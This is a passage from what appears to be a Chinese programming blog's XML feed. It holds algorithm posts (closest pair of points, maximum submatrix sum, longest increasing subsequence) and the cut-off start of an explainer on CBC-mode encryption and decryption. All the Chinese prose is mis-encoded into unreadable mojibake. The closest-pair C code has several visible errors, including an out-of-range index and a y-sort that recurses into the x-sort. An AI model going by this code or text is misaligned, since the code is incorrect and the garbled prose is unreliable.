<h2 id="è§£æ³•äºŒï¼šåˆ†æ²»æ³•"><a href="#è§£æ³•äºŒï¼šåˆ†æ²»æ³•" class="headerlink" title="è§£æ³•äºŒï¼šåˆ†æ²»æ³•"></a>è§£æ³•äºŒï¼šåˆ†æ²»æ³•</h2><ol>
<li>å…ˆå°†ç‚¹é›†æŒ‰ç…§xåæ ‡çš„å¤§å°è¿›è¡Œæ’åº</li>
<li>é€’å½’è¿›è¡Œ3ï¼Œ4ï¼Œ5æ­¥éª¤</li>
<li>å–ä¸€æ¡ä¸­çº¿ï¼Œå°†ç‚¹é›†åˆ†æˆå·¦å³ä¸¤éƒ¨åˆ†ï¼Œå°½é‡æŠŠç‚¹é›†åˆ†ä¸ºæ•°é‡ç›¸åŒçš„ä¸¤åŠï¼Œæ‰¾å‡ºå·¦è¾¹æœ€å°çš„ç‚¹è·ç¦»DLå’Œå³è¾¹æœ€å°çš„ç‚¹è·ç¦»DRï¼Œå–äºŒè€…çš„è¾ƒå°è€…minD=min(DL,DR)</li>
<li>åˆå¹¶ï¼šä»¥ä¸­çº¿ä¸ºä¸­å¿ƒï¼ŒåŠå¾„ä¸ºminDåšåœ†ï¼Œå°†å·¦å³ä¸¤è¾¹çš„ç‚¹ä¸­å¤„äºè¯¥åœ†çš„ç‚¹ä¿å­˜åœ¨ä¸€ä¸ªæ•°ç»„ä¸­ï¼Œæ±‚å‡ºè¿™äº›ç‚¹ä¸­çš„æœ€å°è·ç¦»ï¼Œå…³äºè¿™ä¸ªè·ç¦»ï¼Œå¯ä»¥å…ˆæŒ‰ç…§yåæ ‡çš„å¤§å°è¿›è¡Œæ’åºï¼Œæ¥ç€ï¼Œ å¯¹äºæ¯ä¸€ä¸ªç‚¹P0(x1,y1)ï¼Œåªè¦è®¡ç®—å‡ºç´§æ¥åœ¨P0åé¢çš„6ä¸ªç‚¹å’ŒP0ä¹‹é—´çš„è·ç¦»ï¼Œå–è¾ƒå°å€¼ï¼Œè¯¥å€¼å°±æ˜¯P0å’Œè·ç¦»DRä¸­çš„ç‚¹çš„æœ€å°å€¼ï¼ˆå‡è®¾P0åœ¨DLï¼‰ï¼Œè®¡ç®—è¯¥æ•°ç»„ä¸­çš„æ¯ä¸€ä¸ªç‚¹çš„æœ€å°å€¼ï¼Œå¹¶æ‰¾å‡ºåœ¨è¿™é‡Œè¾¹çš„æœ€å°å€¼mã€‚</li>
<li>å–må’ŒminDçš„è¾ƒå°è€…ï¼Œå³ä¸ºæ‰€æ±‚ã€‚</li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @Description:</span></span><br><span class="line"><span class="comment"> * @Author: Yale_Xin</span></span><br><span class="line"><span class="comment"> * @Date: 2020-04-02 15:59:50</span></span><br><span class="line"><span class="comment"> * @LastEditTime: 2020-04-02 21:03:04</span></span><br><span class="line"><span class="comment"> * @LastEditors: Yale_Xin</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="comment">// äº¤æ¢ä¸¤ä¸ªæ•°çš„å®å®šä¹‰</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> swap(a, b)    \</span></span><br><span class="line">    &#123;                 \</span><br><span class="line">        mPoint t = a; \</span><br><span class="line">        a = b;        \</span><br><span class="line">        b = t;        \</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">// è®¡ç®—ä¸¤ä¸ªç‚¹ä¹‹é—´çš„è·ç¦»å‡½æ•°</span></span><br><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">distance</span><span class="params">(<span class="keyword">double</span> x1, <span class="keyword">double</span> y1, <span class="keyword">double</span> x2, <span class="keyword">double</span> y2)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sqrt</span>((x1 - x2) * (x1 - x2) + (y1 - y2) * (y1 - y2));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">point</span> &#123;</span></span><br><span class="line">    <span class="keyword">double</span> x, y;</span><br><span class="line">&#125; mPoint;</span><br><span class="line">mPoint p[<span class="number">100</span>], mid[<span class="number">100</span>];</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">q_sort</span><span class="params">(<span class="keyword">int</span> l, <span class="keyword">int</span> r)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (l &gt;= r)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">int</span> i = l, j = i + <span class="number">1</span>;</span><br><span class="line">    mPoint key = p[l];</span><br><span class="line">    <span class="keyword">for</span> (; j &lt;= r; j++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (p[j].x &lt;= key.x) &#123;</span><br><span class="line">            i++;</span><br><span class="line">            swap(p[i], p[j]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    swap(p[l], p[i]);</span><br><span class="line">    q_sort(l, i - <span class="number">1</span>);</span><br><span class="line">    q_sort(i + <span class="number">1</span>, r);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">q_sort_y</span><span class="params">(<span class="keyword">int</span> l, <span class="keyword">int</span> r)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (l &gt;= r)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">int</span> i = l, j = i + <span class="number">1</span>;</span><br><span class="line">    mPoint key = mid[l];</span><br><span class="line">    <span class="keyword">for</span> (; j &lt;= r; j++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (mid[j].y &lt;= key.y) &#123;</span><br><span class="line">            i++;</span><br><span class="line">            swap(mid[i], mid[j]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    swap(mid[l], mid[i]);</span><br><span class="line">    q_sort(l, i - <span class="number">1</span>);</span><br><span class="line">    q_sort(i + <span class="number">1</span>, r);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">find_minD</span><span class="params">(<span class="keyword">int</span> l, <span class="keyword">int</span> r)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (r - l == <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="keyword">double</span> d1, d2, d3;</span><br><span class="line">        d1 = distance(p[l].x, p[l].y, p[r + <span class="number">1</span>].x, p[r + <span class="number">1</span>].y);</span><br><span class="line">        d2 = distance(p[l].x, p[l].y, p[r].x, p[r].y);</span><br><span class="line">        d3 = distance(p[l + <span class="number">1</span>].x, p[l + <span class="number">1</span>].y, p[r].x, p[r].y);</span><br><span class="line">        d1 = d1 &lt; d2 ? d1 : d2;</span><br><span class="line">        d1 = d1 &lt; d3 ? d1 : d3;</span><br><span class="line">        <span class="keyword">return</span> d1;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (l + <span class="number">1</span> == r) &#123;</span><br><span class="line">        <span class="keyword">return</span> distance(p[l].x, p[l].y, p[r].x, p[r].y);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// åˆ†åˆ«æ˜¯è·ç¦»ä¸­çº¿è·ç¦»å°äºminçš„ç‚¹çš„æ•°é‡ã€ä¸­çº¿ä½ç½®</span></span><br><span class="line">        <span class="keyword">int</span> number = <span class="number">0</span>, mid_x = p[(l+r)/<span class="number">2</span>].x;</span><br><span class="line">        <span class="keyword">double</span> Lmin, Rmin, <span class="built_in">min</span>, mid_min = <span class="number">32767</span>;</span><br><span class="line">        Lmin = find_minD(l, (l+r) / <span class="number">2</span>);</span><br><span class="line">        Rmin = find_minD((l+r) / <span class="number">2</span> + <span class="number">1</span>, r);</span><br><span class="line">        <span class="built_in">min</span> = Lmin &lt; Rmin ? Lmin : Rmin;</span><br><span class="line">        <span class="comment">// ä»¥ä¸­çº¿ä¸ºä¸ºä¸­å¿ƒï¼Œå¯»æ‰¾å·¦å³ä¸¤è¾¹ä¸­è·ç¦»ä¸­çº¿è·ç¦»å°äºç­‰äºminçš„ç‚¹</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = l; i &lt;= r; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> ((p[i].x - mid_x) &lt; <span class="built_in">min</span>) &#123;</span><br><span class="line">                mid[number++] = p[i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// å°†å¾—åˆ°çš„æ•°ç»„æ ¹æ®åæ ‡yçš„å€¼è¿›è¡Œæ’åº æ±‚å‡ºè¯¥æ•°ç»„ä¸­æœ€å°ç‚¹å¯¹å€¼</span></span><br><span class="line">        <span class="keyword">if</span> (number &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            q_sort_y(<span class="number">0</span>, number - <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; number - <span class="number">1</span>; i++) &#123;</span><br><span class="line">                <span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> j = i + <span class="number">1</span>; j &lt; number; j++) &#123;</span><br><span class="line">                    <span class="keyword">double</span> t = distance(p[i].x, p[i].y, p[j].x, p[j].y);</span><br><span class="line">                    mid_min = mid_min &lt; t ? mid_min : t;</span><br><span class="line">                    <span class="keyword">if</span> (++count &gt; <span class="number">7</span>) &#123;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">min</span> &lt; mid_min ? <span class="built_in">min</span> : mid_min;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">double</span> min_d;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;n);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%lf %lf"</span>, &amp;p[i].x, &amp;p[i].y);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//å…ˆæŒ‰ç…§xåæ ‡è¿›è¡Œæ’åº</span></span><br><span class="line">    q_sort(<span class="number">1</span>, n);</span><br><span class="line">    </span><br><span class="line">    min_d = find_minD(<span class="number">1</span>, n);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%lf"</span>,min_d);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç®—æ³•å¤æ‚åº¦æ˜¯ï¼šOï¼ˆnlognï¼‰</p>
]]></content>
      <categories>
        <category>ç®—æ³•</category>
      </categories>
      <tags>
        <tag>åˆ†æ²»</tag>
        <tag>æ’åº</tag>
      </tags>
  </entry>
  <entry>
    <title>æœ€å¤§å­çŸ©é˜µå’Œ</title>
    <url>/2021/04/11/%E6%9C%80%E5%A4%A7%E5%AD%90%E7%9F%A9%E9%98%B5%E5%92%8C/</url>
    <content><![CDATA[<p>æœ€å¤§å­çŸ©é˜µå’Œï¼Œå¯ä»¥ä½¿ç”¨åŠ¨æ€è§„åˆ’çš„æ€æƒ³ </p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @Author      : YaleXin</span></span><br><span class="line"><span class="comment"> * @Email       : me@yalexin.top</span></span><br><span class="line"><span class="comment"> * @LastEditors : YaleXin</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> num[<span class="number">101</span>][<span class="number">101</span>], sums[<span class="number">101</span>][<span class="number">101</span>], temp[<span class="number">101</span>];</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">oneMatMaxSum</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> nowSum = <span class="number">0</span>, maxSum = <span class="number">-128</span> * <span class="number">100</span> - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span> (nowSum &gt; <span class="number">0</span>)nowSum += temp[i];</span><br><span class="line">        <span class="keyword">else</span> nowSum = temp[i];</span><br><span class="line">        maxSum = <span class="built_in">max</span>(maxSum, nowSum);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> maxSum;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ç»™å‡ºä¸€ä¸ªæ–¹é’ˆ  æ±‚æœ€å¤§å­çŸ©é˜µå’Œ</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    ios::sync_with_stdio(<span class="literal">false</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;n);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;num[i][j]);</span><br><span class="line">            sums[i][j] = num[i][j];</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; n; i++) </span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; n; j++)</span><br><span class="line">            sums[i][j] += sums[i - <span class="number">1</span>][j];</span><br><span class="line">    <span class="keyword">int</span> maxSum = <span class="number">-128</span>, nowSum;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = i; j &lt; n; j++)&#123;</span><br><span class="line">            <span class="comment">// temp ä¿å­˜çš„æ˜¯ä» ç¬¬ i è¡Œåˆ° ç¬¬ j è¡Œæ‰€å¯¹åº”çš„çŸ©é˜µæ¯ä¸€åˆ—çš„å’Œ</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> k  = <span class="number">0</span>; k &lt; n;k++)&#123;</span><br><span class="line">                <span class="keyword">if</span> (i == <span class="number">0</span>)temp[k] = sums[j][k];</span><br><span class="line">                <span class="keyword">else</span> temp[k] = sums[j][k] - sums[i - <span class="number">1</span>][k];</span><br><span class="line">            &#125;</span><br><span class="line">            nowSum = oneMatMaxSum();</span><br><span class="line">            maxSum = <span class="built_in">max</span>(nowSum, maxSum);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; maxSum &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>ç®—æ³•</category>
      </categories>
      <tags>
        <tag>åŠ¨æ€è§„åˆ’</tag>
      </tags>
  </entry>
  <entry>
    <title>æœ€é•¿é€’å¢å­åºåˆ—(LIS)</title>
    <url>/2020/08/24/%E6%9C%80%E9%95%BF%E9%80%92%E5%A2%9E%E5%AD%90%E5%BA%8F%E5%88%97-LIS/</url>
    <content><![CDATA[<p>æš´åŠ›æ³•ï¼šå°†æ‰€æœ‰çš„æ’åˆ—ç»„åˆæšä¸¾ï¼Œè®¡ç®—æœ€é•¿çš„é•¿åº¦ï¼Œæ—¶é—´å¤æ‚åº¦ï¼š<code>O(n!)</code>ï¼Œ<strong>ä¸å¯è¡Œï¼</strong></p>
<p>æ³•äºŒï¼šå°†åŸåºåˆ—<code>A</code>å¤åˆ¶å¹¶å‡åºå¾—åˆ°<code>A&#39;</code>ï¼Œæ±‚<code>A</code> å’Œ<code>A&#39;</code>æœ€é•¿å…¬å…±å­åºåˆ—çš„é•¿åº¦ï¼Œå³ä¸ºæ‰€æ±‚ï¼Œæ—¶é—´å¤æ‚åº¦æ˜¯<code>O(n^2)</code></p>
<p>ä¸‹é¢ä»‹ç»å¦å¤–çš„ä¸¤ç§æ–¹æ³•ï¼š<a id="more"></a></p>
<h2 id="æ¨¡æ¿ä»£ç "><a href="#æ¨¡æ¿ä»£ç " class="headerlink" title="æ¨¡æ¿ä»£ç "></a>æ¨¡æ¿ä»£ç </h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * è½¬ç§»çŠ¶æ€ï¼š dp[i] = max&#123;0,dp[j]&#125; + 1, 0 &lt; j &lt; i</span></span><br><span class="line"><span class="comment"> * O(n^2)</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> nums</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">LISByDp</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> maxLen = <span class="number">1</span>, largerLen = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span>[] dp = <span class="keyword">new</span> <span class="keyword">int</span>[nums.length];</span><br><span class="line">    dp[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">        largerLen = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; i; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (dp[j] &gt; largerLen &amp;&amp; nums[j] &lt; nums[i]) &#123;</span><br><span class="line">                largerLen = dp[j];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        dp[i] = largerLen + <span class="number">1</span>;</span><br><span class="line">        maxLen = maxLen &gt; dp[i] ? maxLen : dp[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> maxLen;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * O(nlogn)</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> nums</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">LISByD</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> lastIndex = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span>[] d = <span class="keyword">new</span> <span class="keyword">int</span>[nums.length];</span><br><span class="line">    d[<span class="number">0</span>] = nums[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (nums[i] &gt; d[lastIndex]) &#123;</span><br><span class="line">            d[++lastIndex] = nums[i];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">int</span> j = lower_bound(d, <span class="number">0</span>, lastIndex, nums[i]);</span><br><span class="line">            d[j] = nums[i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> lastIndex + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">lower_bound</span><span class="params">(<span class="keyword">int</span>[] d, <span class="keyword">int</span> start, <span class="keyword">int</span> end, <span class="keyword">int</span> target)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> mid = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (start &lt; end) &#123;</span><br><span class="line">        mid = (start + end) / <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span> (target &gt; d[mid]) &#123;</span><br><span class="line">            start = mid + <span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            end = mid;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> end;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>ç®—æ³•</category>
      </categories>
      <tags>
        <tag>LIS</tag>
      </tags>
  </entry>
  <entry>
    <title>å¸¦ä½ äº†è§£CBCè§£å¯†</title>
    <url>/2022/07/09/%E5%B8%A6%E4%BD%A0%E4%BA%86%E8%A7%A3CBC%E8%A7%A3%E5%AF%86/</url>
    <content><![CDATA[<p><a href="https://www.jianshu.com/p/1001b4c2adeb" target="_blank" rel="noopener">https://www.jianshu.com/p/1001b4c2adeb</a></p>
<p><a href="https://blog.csdn.net/u013577244/article/details/86310881?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-3.not_use_machine_learn_pai&amp;depth_1-utm_source=distribute.pc_relevant.no" target="_blank" rel="noopener">https://blog.csdn.net/u013577244/article/details/86310881?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-3.not_use_machine_learn_pai&amp;depth_1-utm_source=distribute.pc_relevant.no</a></p>
<h2 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h2><p><code>CBC</code>åŠ å¯†æŠ€æœ¯å±äºåˆ†ç»„æ¨¡å¼åŠ å¯†æŒ‡å°†å‰ä¸€ä¸ªå¯†æ–‡åˆ†ç»„ä¸å½“å‰æ˜æ–‡åˆ†ç»„çš„å†…å®¹æ··åˆèµ·æ¥è¿›è¡ŒåŠ å¯†ï¼Œè¿™æ ·å°±å¯ä»¥é¿å…<code>ECB</code>æ¨¡å¼çš„å¼±ç‚¹ã€‚</p>
<blockquote>
<p>å¯¹ç»™å®šçš„éšæœºå¯†é’¥ï¼Œæ¯ä¸€å—æ˜æ–‡å¯¹åº”å›ºå®šçš„å¯†æ–‡å—ï¼Œå³ç›¸åŒçš„æ˜æ–‡ç»„è•´å«ç€ç›¸åŒçš„å¯†æ–‡ç»„ï¼Œç±»ä¼¼ç”µç æœ¬çš„ç å­—ï¼Œè¿™å°±æ˜¯ECBæ¨¡å¼</p>
</blockquote>
<p><code>CBC</code>æ¨¡å¼çš„å…¨ç§°Cipher Block Chaining æ¨¡å¼ï¼ˆå¯†æ–‡åˆ†ç»„ç»„é“¾æ¥æ¨¡å¼ï¼‰ï¼Œä¹‹æ‰€ä»¥å«è¿™ä¸ªåå­—æ˜¯å› ä¸ºå¯†æ–‡åˆ†ç»„æ˜¯åƒé“¾æ¡ä¸€æ ·ç›¸äº’è¿æ¥åœ¨ä¸€èµ·ã€‚</p>
<p>æœ¬æ–‡å‚è€ƒè‡ªæ–‡ç« <a href="https://blog.csdn.net/u013577244/article/details/86310881?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-3.not_use_machine_learn_pai&depth_1-utm_source=distribute.pc_relevant.no" target="_blank" rel="noopener">ã€Bugku Login4 (CBCå­—èŠ‚ç¿»è½¬æ”»å‡»)ã€‘</a></p>
<a id="more"></a>

<h2 id="ç›¸å…³åŸç†"><a href="#ç›¸å…³åŸç†" class="headerlink" title="ç›¸å…³åŸç†"></a>ç›¸å…³åŸç†</h2><h3 id="åŠ å¯†è¿‡ç¨‹"><a href="#åŠ å¯†è¿‡ç¨‹" class="headerlink" title="åŠ å¯†è¿‡ç¨‹"></a>åŠ å¯†è¿‡ç¨‹</h3><p>å…ˆçœ‹æµç¨‹å›¾ï¼š<br><img src="https://cdn.yalexin.top/image-20220709182948691.png" alt="image-20220709182948691"></p>
<ol>
<li>åˆ†ç»„ï¼šåŠ å¯†ä¹‹å‰ï¼Œå…ˆå°†è¦ä¼ è¾“æˆ–è€…åŠ å¯†çš„æ˜æ–‡æ•°æ®è¿›è¡Œåˆ†ç»„ï¼Œé€šå¸¸æŒ‰ç…§16ä¸ªå­—èŠ‚åˆ†ä¸ºä¸€ç»„ï¼Œå¦‚æœæœ€åä¸€ç»„ä¸å¤Ÿ16ä¸ªå­—èŠ‚ï¼Œåˆ™ä¼šé€šè¿‡<code>\x0n</code>æ¥è¡¥å……ï¼Œnä»£è¡¨è¡¥å……çš„ä¸ªæ•°ï¼Œä¾‹å¦‚æœ€åä¸€ç»„çš„æ•°ç»„å¦‚æœåªæœ‰14ä¸ªå­—èŠ‚ï¼Œé‚£ä¹ˆåé¢ä¸¤ä¸ªå­—èŠ‚ä»¥<code>\x02</code>è¿›è¡Œå¡«å……ï¼Œå¦‚æœç¼ºå¤±çš„æ•°ç›®è¶…è¿‡äº†10ï¼Œåˆ™ä½¿ç”¨è¿›åå…­åˆ¶ï¼Œä¾‹å¦‚å¦‚æœæœ€åä¸€ç»„æ•°æ®åªæœ‰6å­—èŠ‚ï¼Œé‚£ä¹ˆæœ€å10ä¸ªå­—èŠ‚éƒ½ä½¿ç”¨<code>\x0a</code>è¿›è¡Œå¡«å……ã€‚æˆ‘ä»¬ç§°è¯¥æ˜æ–‡ä¸º<code>plain</code>ï¼Œæ¯æ®µæ˜æ–‡æˆ‘ä»¬æˆä¸º<code>plain[i]</code></li>
<li>ç”Ÿæˆåˆå§‹åŒ–å‘é‡ï¼šå‘é‡é•¿åº¦å’Œåˆ†ç»„é•¿åº¦ä¸€è‡´ï¼Œç”¨äºå’Œç¬¬ä¸€ç»„å‘é‡è¿›è¡Œå¼‚æˆ–è¿ç®—ã€‚æˆ‘ä»¬ç§°è¯¥å‘é‡ä¸º<code>iv</code></li>
<li>åˆå§‹å‘é‡å’Œç¬¬ä¸€æ®µæ˜æ–‡<code>plain[1]</code>è¿›è¡Œå¼‚æˆ–è¿ç®—ï¼Œå®Œäº‹ä»¥åå†ç»è¿‡ç‰¹å®šçš„åŠ å¯†è¿ç®—<code>encrypt()</code>ï¼Œå¾—åˆ°å¯†æ–‡<code>cipher[1]</code></li>
<li><code>cipher[1]</code>ç»§ç»­å’Œæ˜æ–‡<code>plain[2]</code>è¿›è¡Œå¼‚æˆ–è¿ç®—ï¼Œå®Œäº‹ä»¥åå†ç»è¿‡ç‰¹å®šçš„åŠ å¯†è¿ç®—<code>encrypt()</code>ï¼Œå¾—åˆ°å¯†æ–‡<code>cipher[2]</code></li>
<li>â€¦â€¦</li>
<li>æ‰€æœ‰çš„æ˜æ–‡éƒ½å‚ä¸è¿ç®—ä»¥åï¼Œå°†å¾—åˆ°çš„<code>cipher[i]</code>ç»„è£…åˆå¹¶ï¼Œå¾—åˆ°å¯†æ–‡æ®µã€‚</li>
</ol>
<h3 id="è§£å¯†è¿‡ç¨‹"><a href="#è§£å¯†è¿‡ç¨‹" class="headerlink" title="è§£å¯†è¿‡ç¨‹"></a>è§£å¯†è¿‡ç¨‹</h3><p>è§£å¯†è¿‡ç¨‹å®é™…ä¸Šå°±æ˜¯å°†åŠ å¯†è¿‡ç¨‹é€†ç€èµ°ä¸€éã€‚</p>
<p>æ­¤å¤–ï¼Œæˆ‘ä»¬è¿˜åº”è¯¥æ˜ç™½å¼‚æˆ–çš„åŸç†ï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">0 âŠ• 1 = 1</span><br><span class="line">x âŠ• x = 0</span><br><span class="line">x âŠ• 0 = x</span><br></pre></td></tr></table></figure>

<p>å¦‚æœæ•°æ®<code>A</code>å’Œå¯†é’¥<code>B</code>å¼‚æˆ–å¾—åˆ°å¯†æ–‡<code>C</code>ï¼Œè¦æƒ³æ¢å¤<code>A</code>ï¼Œåªè¦æ‹¿ç€å¯†é’¥<code>B</code>å†å’Œå¯†æ–‡<code>C</code>å¼‚æˆ–ï¼Œå³å¯æ¢å¤æ˜æ–‡<code>A</code>ï¼Œè¿™æ˜¯å› ä¸ºå¼‚æˆ–æ»¡è¶³ç»“åˆå¾‹ï¼Œä¸”ï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">A âŠ• B = C</span><br><span class="line">åˆ™æœ‰ï¼š</span><br><span class="line">A âŠ• B âŠ• B = C âŠ• B</span><br><span class="line">å³ï¼š</span><br><span class="line">A âŠ• 0 = C âŠ• B</span><br><span class="line">å³ï¼š</span><br><span class="line">A = C âŠ• B</span><br></pre></td></tr></table></figure>

<p>è¿˜æ˜¯å…ˆçœ‹æµç¨‹å›¾ï¼š</p>
<p><img src="https://cdn.yalexin.top/image-20220709185258788.png" alt="image-20220709185258788"></p>
<ol>
